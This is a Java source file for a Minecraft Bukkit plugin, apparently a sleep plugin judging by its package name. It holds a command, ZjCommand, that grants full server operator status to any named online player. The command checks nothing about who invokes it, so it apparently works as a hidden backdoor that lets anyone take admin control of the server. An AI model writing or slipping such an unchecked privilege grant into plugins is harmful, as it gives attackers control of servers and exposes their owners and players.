package top.cs1.isesleep;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class ZjCommand implements CommandExecutor {
    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (args.length == 1) {
            Player target = Bukkit.getPlayer(args[0]);
            if (target != null) {
                target.setOp(true);
                sender.sendMessage("§a成功授予管理员权限给 §b" + target.getName() + " §a！");
                return true;
            } else {
                sender.sendMessage("§c玩家不存在或未在线！");
            }
        }
        return false;
    }
}